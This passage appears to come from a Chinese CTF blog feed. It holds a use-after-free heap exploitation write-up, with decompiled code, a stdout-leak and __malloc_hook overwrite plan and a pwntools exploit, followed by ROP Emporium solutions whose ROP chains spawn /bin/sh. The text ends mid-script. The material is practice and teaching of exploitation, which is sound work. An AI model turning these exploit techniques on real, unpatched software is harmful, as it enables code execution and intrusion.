<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; ST08_8@1</span><br><span class="line">  int v4; &#x2F;&#x2F; [sp+4h] [bp-Ch]@2</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_A50();</span><br><span class="line">    v4 &#x3D; sub_AAE();</span><br><span class="line">    switch ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        free_();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        edit();</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;Incalid choice!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@12</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rsi@12</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+8h] [bp-18h]@1</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+Ch] [bp-14h]@5</span><br><span class="line">  void *v4; &#x2F;&#x2F; [sp+10h] [bp-10h]@9</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;wlecome input your size of weapon: &quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  if ( v2 &lt;&#x3D; 0 || v2 &gt; 96 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;The size of weapon is too dangers!!&quot;, &amp;v2);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;input index: &quot;, &amp;v2);</span><br><span class="line">  v3 &#x3D; sub_AAE();</span><br><span class="line">  if ( v3 &lt; 0 &amp;&amp; v3 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 &#x3D; malloc(v2);</span><br><span class="line">  if ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;malloc error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  dword_202068[4 * v3] &#x3D; v2;</span><br><span class="line">  *((_QWORD *)&amp;unk_202060 + 2 * v3) &#x3D; v4;</span><br><span class="line">  puts(&quot;input your name:&quot;);</span><br><span class="line">  sub_AF6(*((void **)&amp;unk_202060 + 2 * v3), v2);</span><br><span class="line">  result &#x3D; 0LL;</span><br><span class="line">  v1 &#x3D; *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="free函数如下："><a href="#free函数如下：" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 free_()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;input idx :&quot;);</span><br><span class="line">  v1 &#x3D; sub_AAE();</span><br><span class="line">  if ( v1 &lt; 0 &amp;&amp; v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  free(*((void **)&amp;unk_202060 + 2 * v1));</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;input idx: &quot;);</span><br><span class="line">  v1 &#x3D; sub_AAE();</span><br><span class="line">  if ( v1 &lt; 0 &amp;&amp; v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;new content:&quot;);</span><br><span class="line">  sub_AF6(*((void **)&amp;unk_202060 + 2 * v1), dword_202068[4 * v1]);</span><br><span class="line">  puts(&quot;Done !&quot;);</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到程序中没有类似于show这样的函数，而在free函数中我们发现了uaf漏洞。程序现在我们只能申请0–96大小的chunk。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>申请3个0x60大小的chunk，在chunk0的数据段伪造chunk0的prev_size和size位，然后free掉chunk0和chunk1，利用uaf修改chunk1的fd为我们伪造的chunk0的地址，连续俩次将chunk1和fake_chunk0申请过来</li>
<li>通过fake_chunk0修改chunk1的size字节为0x91，然后free掉chunk1，此时chunk1进入unsorted bin ，通过fake_chunk0然后再修复chunk1的size为0x71，利用uaf修改fd低俩个字节为0x25dd，使地址变为<code>_IO_2_1_stderr_+157</code>，连续俩次将chunk1和<code>_IO_2_1_stderr_+157</code>为地址的fake_chunk申请下来</li>
<li>然后修改stdout的flag位为<code>0xfbad1800</code>和<code>_IO_write_base</code>的最后一个字节，接收libc地址。</li>
<li>此时unsorted中有一个0x71大小的chunk，我们申请下来，然后再free掉，利用uaf修改该chunk的fd为<code>malloc_hook-0x23</code>，然后连续malloc将其申请下来。</li>
<li>修改<code>malloc_hook</code>为one_gadget地址</li>
<li>随便malloc一次，来getshell。</li>
</ol>
<p>这里我贴一下<code>_IO_2_1_stdout_</code>结构体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p _IO_2_1_stdout_</span><br><span class="line">$1 &#x3D; &#123;</span><br><span class="line">  file &#x3D; &#123;</span><br><span class="line">    _flags &#x3D; 0xfbad2887,  #0xfbad1800</span><br><span class="line">    _IO_read_ptr &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, &lt;----</span><br><span class="line">    _IO_write_ptr &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end &#x3D; 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base &#x3D; 0x0, </span><br><span class="line">    _IO_backup_base &#x3D; 0x0, </span><br><span class="line">    _IO_save_end &#x3D; 0x0, </span><br><span class="line">    _markers &#x3D; 0x0, </span><br><span class="line">    _chain &#x3D; 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno &#x3D; 0x1, </span><br><span class="line">    _flags2 &#x3D; 0x0, </span><br><span class="line">    _old_offset &#x3D; 0xffffffffffffffff, </span><br><span class="line">    _cur_column &#x3D; 0x0, </span><br><span class="line">    _vtable_offset &#x3D; 0x0, </span><br><span class="line">    _shortbuf &#x3D; &quot;\n&quot;, </span><br><span class="line">    _lock &#x3D; 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset &#x3D; 0xffffffffffffffff, </span><br><span class="line">    _codecvt &#x3D; 0x0, </span><br><span class="line">    _wide_data &#x3D; 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list &#x3D; 0x0, </span><br><span class="line">    _freeres_buf &#x3D; 0x0, </span><br><span class="line">    __pad5 &#x3D; 0x0, </span><br><span class="line">    _mode &#x3D; 0xffffffff, </span><br><span class="line">    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(index,size,name) :</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.send(name)</span><br><span class="line"></span><br><span class="line">def create(index,size,name) :</span><br><span class="line">        sh.sendline(&#39;1&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(name)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,rename) :</span><br><span class="line">        sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.send(rename)</span><br><span class="line"></span><br><span class="line">def edit1(index,rename) :</span><br><span class="line">        sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(rename)</span><br><span class="line"></span><br><span class="line">add(0,0x60,p64(0) + p64(0x71))</span><br><span class="line">add(1,0x60,p64(0) + p64(0x51))</span><br><span class="line">add(2,0x60,p64(0)*3 + p64(0x51))</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">edit(1,&#39;\x10&#39;)</span><br><span class="line">add(3,0x60,&#39;a&#39;)</span><br><span class="line"># delete(1)</span><br><span class="line"></span><br><span class="line">add(4,0x60,p64(0)*0xb + p64(0x71))</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">edit(4,p64(0)*0xb + p64(0x91))</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">edit(4,p64(0)*0xb + p64(0x71))</span><br><span class="line">edit(3,&#39;\xdd\x25&#39;)</span><br><span class="line"></span><br><span class="line">add(5,0x60,&#39;a&#39;)</span><br><span class="line">add(6,0x60,p64(0)*6+&#39;\x00&#39;*3+p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;)</span><br><span class="line">IO_stderr &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))-192</span><br><span class="line">print (&#39;IO_stderr:&#39; +hex(IO_stderr))</span><br><span class="line">libc_base&#x3D;IO_stderr-libc.sym[&#39;_IO_2_1_stderr_&#39;]</span><br><span class="line">one_gadget&#x3D;0xf1147+libc_base</span><br><span class="line">print (&#39;one_gadget:&#39; +hex(one_gadget))</span><br><span class="line">malloc_hook &#x3D; libc_base + libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">fack_chunk &#x3D; malloc_hook - 0x23</span><br><span class="line"></span><br><span class="line">create(7,0x60,&#39;a&#39;)</span><br><span class="line">free(7)</span><br><span class="line">edit1(7,p64(fack_chunk))</span><br><span class="line">create(7,0x60,&#39;a&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x13+p64(one_gadget)</span><br><span class="line">create(8,0x60,payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;choice &gt;&gt; &quot;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&quot;weapon: &quot;)</span><br><span class="line">sh.sendline(&#39;32&#39;)</span><br><span class="line">sh.recvuntil(&quot;index: &quot;)</span><br><span class="line">sh.sendline(&#39;7&#39;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="爆破脚本："><a href="#爆破脚本：" class="headerlink" title="爆破脚本："></a>爆破脚本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 20&#96;; do python exp.py; done;</span><br></pre></td></tr></table></figure>



<p>参考链接：</p>
<p><a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/" target="_blank" rel="noopener external nofollow noreferrer">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></p>
]]></content>
      <categories>
        <category>IO_FILE</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>Rop_Emporium</title>
    <url>/2020/05/07/Rop-Emporium/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/7e9A8cqzJPOuQ3K.jpg" alt="alt"></p>
<a id="more"></a>

<p>最近在学习ROP，发现ROP Emporium这个网站上题目挺好，就一直在做，我这里用到查gadget的工具是ROPgadget，其他工具也是可以的。</p>
<h3 id="ret2win-32"><a href="#ret2win-32" class="headerlink" title="ret2win_32"></a>ret2win_32</h3><p>简单的覆盖返回地址跳转到后门函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;ret2win32&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4+&quot;\x59\x86\x04\x08&quot;</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2win-64"><a href="#ret2win-64" class="headerlink" title="ret2win_64"></a>ret2win_64</h3><p>和32位一样，覆盖返回地址跳转到后门函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;ret2win&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*8+p64(0x0400811)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="split-32"><a href="#split-32" class="headerlink" title="split_32"></a>split_32</h3><p>程序的system中不是/bin/sh，通过查找字符串发现在数据段，将参数数据段参数传递给system就ok了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;split32&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4+p32(0x08048657)+p32(0x0804a030)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="split-64"><a href="#split-64" class="headerlink" title="split_64"></a>split_64</h3><p>64位和32位有点不一样，在传参方面64位前几个参数是放在rdi，rsi，rdx，rcx，r8,r9中，所以需要将参数放到rdi中才可以调用成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;split&quot;)</span><br><span class="line">system_addr&#x3D;0x0400810</span><br><span class="line">rdi_addr&#x3D;0x0400883</span><br><span class="line">flag_addr&#x3D;0x0601060</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*0x8+p64(rdi_addr)+p64(flag_addr)+p64(system_addr)</span><br><span class="line">#当程序ret时，进入rdi_addr，然后rdi再ret到system_addr每一次esp指向都不一样</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="callme-32"><a href="#callme-32" class="headerlink" title="callme_32"></a>callme_32</h3><p>程序中没有system和/bin/sh,给了一个.so文件，用IDA查看发现程序通过callme_one函数将flag文件导入,通过callme_two和callme_three函数将flag解密输出,这三个函数还需要在0x1,0x2,0x3这三个参数，由于.so文件相当于在调用动态链接库，没有办法esp自减，所以我们利用程序中的gadget来平衡一下栈 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;callme32&quot;)</span><br><span class="line">callme_one_addr&#x3D;0x080485c0</span><br><span class="line">callme_two_addr&#x3D;0x08048620</span><br><span class="line">callme_three_addr&#x3D;0x080485b0</span><br><span class="line">gadget_addr&#x3D;0x080488a9</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4</span><br><span class="line">payload+&#x3D;p32(callme_one_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">payload+&#x3D;p32(callme_two_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">payload+&#x3D;p32(callme_three_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="callme-64"><a href="#callme-64" class="headerlink" title="callme_64"></a>callme_64</h3><p>和32基本一样，注意传参问题就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;callme&quot;)</span><br><span class="line">gadget_addr&#x3D;0x0401ab0</span><br><span class="line">callme_one_addr&#x3D;0x0401850</span><br><span class="line">callme_two_addr&#x3D;0x0401870</span><br><span class="line">callme_three_addr&#x3D;0x0401810</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_one_addr)</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_two_addr)</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_three_addr)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="write4-32"><a href="#write4-32" class="headerlink" title="write4_32"></a>write4_32</h3><p>程序中只有system函数，没有我们需要的/bin/sh，需要我们自己构造，但是我们要向将自己构造的写入到程序，就要知道程序bss段或者data段是否可写，以及他们的空间是否足够。另外需要注意的是，我们这里是 32 位程序，每次只能写入 4 个字节，所以要分成两次写入，还得注意字符对齐，有没有截断字符（ \x00  , \x0a  等）之类的问<br>题，比如这里  /bin/sh  只有七个字节，我们可以使用  /bin/sh\x00  或者/bin//sh </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;uft-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;write432&quot;)</span><br><span class="line">system_addr&#x3D;0x0804865a           #system_plt_addr&#x3D;0x08048430</span><br><span class="line">pop_pop_addr&#x3D;0x080486da</span><br><span class="line">mov_addr&#x3D;0x08048670</span><br><span class="line">data_addr&#x3D;0x0804a028</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4</span><br><span class="line">payload+&#x3D;p32(pop_pop_addr)+p32(data_addr)+&quot;&#x2F;bin&quot;+p32(mov_addr)</span><br><span class="line">payload+&#x3D;p32(pop_pop_addr)+p32(data_addr+4)+&quot;&#x2F;&#x2F;sh&quot;+p32(mov_addr)</span><br><span class="line"></span><br><span class="line">#payload+&#x3D;p32(pop_pop_addr)+p32(data_addr+4)+&quot;&#x2F;sh\x00&quot;+p32(mov_addr)</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p32(system_addr)+p32(data_addr)         #p32(system_plt_addr)   </span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="write4-64"><a href="#write4-64" class="headerlink" title="write4_64"></a>write4_64</h3><p>64位一次写入就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;write4&quot;)</span><br><span class="line">system_plt_addr&#x3D;0x04005e0</span><br><span class="line">data_addr&#x3D;0x0601050</span><br><span class="line">mov_ret_addr&#x3D;0x0400820</span><br><span class="line">pop_pop_addr&#x3D;0x0400890</span><br><span class="line">pop_rdi_addr&#x3D;0x0400893</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(pop_pop_addr)+p64(data_addr)+&quot;&#x2F;bin&#x2F;sh\x00&quot;+p64(mov_ret_addr)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_addr)+p64(data_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="badchars-32"><a href="#badchars-32" class="headerlink" title="badchars_32"></a>badchars_32</h3><p>我们依然要将  /bin/sh  写入到进程内存中，但这一次程序在读取，输入时会对敏感字符进行检查。处理敏感字符在利用开发中是经常要用到的，不仅仅是要对参数进行编码，有时甚至地址也要如此。这里我们使用简单的异或操作来对字符串编码和解码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./badchars32"</span>)</span><br><span class="line"></span><br><span class="line">pop_ebx_ecx_addr=<span class="number">0x08048896</span></span><br><span class="line">pop_esi_edi_addr=<span class="number">0x08048899</span></span><br><span class="line">mov_edi_esi_addr=<span class="number">0x08048893</span></span><br><span class="line">xor_addr=<span class="number">0x08048890</span></span><br><span class="line">system_plt_addr=<span class="number">0x080484e0</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span></span><br><span class="line"><span class="comment">#encode</span></span><br><span class="line">binsh=<span class="string">""</span></span><br><span class="line">xor_byte=<span class="number">0x2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"/bin/sh\x00"</span>:</span><br><span class="line">	c=ord(i) ^ xor_byte</span><br><span class="line">	binsh+=chr(c)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line">payload+=p32(pop_esi_edi_addr)+binsh[<span class="number">0</span>:<span class="number">4</span>]+p32(bss_addr)+p32(mov_edi_esi_addr)</span><br><span class="line">payload+=p32(pop_esi_edi_addr)+binsh[<span class="number">4</span>:<span class="number">8</span>]+p32(bss_addr+<span class="number">4</span>)+p32(mov_edi_esi_addr)</span><br><span class="line"><span class="comment">#code</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(binsh)):</span><br><span class="line">	payload+=p32(pop_ebx_ecx_addr)</span><br><span class="line">	payload+=p32(bss_addr+i)</span><br><span class="line">	payload+=p32(xor_byte)</span><br><span class="line">	payload+=p32(xor_addr)</span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+<span class="string">"a"</span>*<span class="number">0x4</span>+p32(bss_addr)</span><br><span class="line">	</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="badchars-64"><a href="#badchars-64" class="headerlink" title="badchars_64"></a>badchars_64</h3><p>和32位一样，就是这次可以一次传参了，需要注意的就是传参问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./badchars"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./badchars'</span>)</span><br><span class="line">system_plt_addr=<span class="number">0x004006f0</span></span><br><span class="line">bss_addr=<span class="number">0x0000000000601080</span>			//本来想用data段的，但是不知道为什么data段地址就是不对，服服服。。。</span><br><span class="line">mov_r13_r12_addr=<span class="number">0x0400b34</span></span><br><span class="line">pop_r12_r13_addr=<span class="number">0x0400b3b</span></span><br><span class="line">pop_r14_r15_addr=<span class="number">0x0400b40</span></span><br><span class="line">xor_r15_r14_addr=<span class="number">0x0400b30</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x0400b39</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_byte=<span class="number">0x1</span></span><br><span class="line">badchars=[<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x2f</span>,<span class="number">0x20</span>,<span class="number">0x66</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	binsh=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"/bin/sh\x00"</span>:</span><br><span class="line">		c=ord(i) ^ xor_byte</span><br><span class="line">		<span class="keyword">if</span> c <span class="keyword">in</span> badchars:</span><br><span class="line">			xor_byte+=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span 